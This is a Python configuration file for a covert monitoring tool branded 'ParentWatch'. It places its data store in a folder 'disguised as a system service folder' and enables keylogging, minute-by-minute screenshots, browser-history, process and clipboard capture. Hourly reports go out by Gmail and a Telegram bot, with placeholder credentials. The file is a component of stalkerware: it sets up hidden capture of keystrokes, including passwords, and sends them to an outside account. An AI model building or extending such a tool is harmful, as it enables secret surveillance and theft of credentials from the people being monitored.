# config.py — all settings in one place
import os
from pathlib import Path

# ── VAULT LOCATION ───────────────────────────────────────────────────────────
# AppData\Roaming — always writable, disguised as a system service folder
VAULT_DIR = Path(os.path.expanduser("~")) / "AppData" / "Local" / "Microsoft" / "TokenBroker" / ".cache"

# ── ENCRYPTION ───────────────────────────────────────────────────────────────
# Change this password before building — this is your master key
VAULT_PASSWORD = "CHANGE_THIS_PASSWORD_BEFORE_USE"

# ── COLLECTION INTERVALS ─────────────────────────────────────────────────────
SCREENSHOT_INTERVAL_SECONDS    = 60    # screenshot every 60 seconds
LOG_FLUSH_INTERVAL_SECONDS     = 300   # flush keylogs to disk every 5 minutes
BROWSER_CHECK_INTERVAL_SECONDS = 600   # pull browser history every 10 minutes
DELIVERY_INTERVAL_SECONDS      = 3600  # send report every 1 hour

# ── MODULES TOGGLE ───────────────────────────────────────────────────────────
ENABLE_KEYLOGGER       = True
ENABLE_SCREENSHOTS     = True
ENABLE_BROWSER_HISTORY = True
ENABLE_PROCESS_TRACKER = True
ENABLE_CLIPBOARD       = True

# ── GMAIL DELIVERY ───────────────────────────────────────────────────────────
ENABLE_EMAIL        = True
EMAIL_FROM          = "your_sender_gmail@gmail.com"   # Gmail you send FROM
EMAIL_PASSWORD      = "your_app_password_here"        # Gmail App Password (not your real password)
EMAIL_TO            = "your_personal@gmail.com"        # Gmail you receive ON
EMAIL_SUBJECT_PREFIX = "[ParentWatch]"

# ── TELEGRAM DELIVERY ────────────────────────────────────────────────────────
ENABLE_TELEGRAM     = True
TELEGRAM_BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE"           # from @BotFather
TELEGRAM_CHAT_ID    = "YOUR_CHAT_ID_HERE"             # your personal chat ID
